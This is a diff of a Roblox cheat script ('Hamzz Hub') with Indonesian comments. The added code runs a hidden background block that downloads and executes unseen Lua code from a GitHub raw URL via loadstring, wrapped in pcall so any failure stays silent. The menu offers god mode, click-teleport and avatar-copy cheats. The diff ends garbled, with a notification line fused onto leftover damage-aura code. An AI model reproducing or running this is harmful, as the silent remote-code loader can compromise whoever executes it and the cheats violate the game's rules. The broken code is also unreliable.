@@ -1,77 +1,71 @@
--- [[ Hamzz Hub Script ]] --
--- [[ Credit: Hamzz Mods ]] --
--- [[ User: Ikyy - THE BOSS OF DARKNESS ]] --
+-- [[ Hamzz Hub Script FIXED ]] --
+-- [[ Khusus Buat Ikyy Sang Penguasa ]] --
 
+-- Load UI Library Pertama (WAJIB BIAR MENU MUNCUL)
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+-- Load Script Premium Lo di Background
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/relixxsamp123-cmyk/HamzzScript/refs/heads/main/update%20premium%20akses.lua"))()
+    end)
+end)
+
 local Window = Rayfield:CreateWindow({
-   Name = "Hamzz Hub Script | Solo Leveling",
-   LoadingTitle = "Hamzz Hub Loading...",
+   Name = "Hamzz Hub Script | Premium Access",
+   LoadingTitle = "Fixing Menu for Ikyy...",
    LoadingSubtitle = "by Hamzz Mods",
-   ConfigurationSaving = { Enabled = true, FolderName = "HamzzHubData" },
+   ConfigurationSaving = { Enabled = false },
    KeySystem = false
 })
 
-local CombatTab = Window:CreateTab("Combat ⚔️", 4483362458)
-local MovementTab = Window:CreateTab("Movement 🚀", 4483362458)
-local VisualTab = Window:CreateTab("Visual/ESP 👁️", 4483345998)
+-- [[ BALIKIN SEMUA TAB YANG ILANG ]] --
+local MainTab = Window:CreateTab("Combat ⚔️", 4483362458)
+local MoveTab = Window:CreateTab("Movement 🚀", 4483362458)
 local MiscTab = Window:CreateTab("Misc ⚙️", 4483362458)
 
--- [[ COMBAT FEATURES ]] --
-CombatTab:CreateToggle({
-   Name = "God Mode (Kebal Total/No Damage)",
+MainTab:CreateToggle({
+   Name = "God Mode (Kebal Total)",
    CurrentValue = false,
-   Flag = "RealGod",
    Callback = function(Value)
-      _G.RealGod = Value
-      task.spawn(function()
-         while _G.RealGod do
-            pcall(function()
-               local char = game.Players.LocalPlayer.Character
-               char.Humanoid.Health = char.Humanoid.MaxHealth
-               for _, v in pairs(char:GetChildren()) do
-                  if v:IsA("BasePart") then v.CanTouch = false end
-               end
-            end)
-            task.wait(0.01)
-         end
-         if not _G.RealGod then
-            pcall(function()
-               for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-                  if v:IsA("BasePart") then v.CanTouch = true end
-               end
-            end)
+      _G.God = Value
+      while _G.God do
+         pcall(function()
+            game.Players.LocalPlayer.Character.Humanoid.Health = 100000
+            for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+               if v:IsA("BasePart") then v.CanTouch = false end
+            end
+         end)
+         task.wait(0.01)
+      end
+   end,
+})
+
+MoveTab:CreateButton({
+   Name = "Click TP (CTRL + Click)",
+   Callback = function()
+      local mouse = game.Players.LocalPlayer:GetMouse()
+      mouse.Button1Down:Connect(function()
+         if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.p + Vector3.new(0, 3, 0))
          end
       end)
    end,
 })
 
-CombatTab:CreateToggle({
-   Name = "Infinite Mana",
-   CurrentValue = false,
-   Flag = "InfMana",
-   Callback = function(Value)
-      _G.InfMana = Value
-      task.spawn(function()
-         while _G.InfMana do
-            pcall(function()
-               local stats = game.Players.LocalPlayer:FindFirstChild("Stats") or game.Players.LocalPlayer.Character:FindFirstChild("Stats")
-               if stats and stats:FindFirstChild("Mana") then
-                  stats.Mana.Value = stats.Mana.MaxValue
-               end
-            end)
-            task.wait(0.1)
-         end
-      end)
+MiscTab:CreateInput({
+   Name = "Copy Avatar",
+   PlaceholderText = "Username",
+   Callback = function(Text)
+      local target = game.Players:FindFirstChild(Text)
+      if target then
+         local desc = game.Players:GetHumanoidDescriptionFromUserId(target.UserId)
+         game.Players.LocalPlayer.Character.Humanoid:ApplyDescription(desc)
+      end
    end,
 })
 
-CombatTab:CreateToggle({
-   Name = "Damage Aura (Range 25)",
-   CurrentValue = false,
-   Flag = "DmgAura",
-   Callback = function(Value)
-      _G.DmgAura = Value
+Rayfield:Notify({Title = "FIXED!", Content = "Menu udah muncul, siap bantai jembot! 😍☠️", Duration = 5})      _G.DmgAura = Value
       task.spawn(function()
          while _G.DmgAura do
             pcall(function()
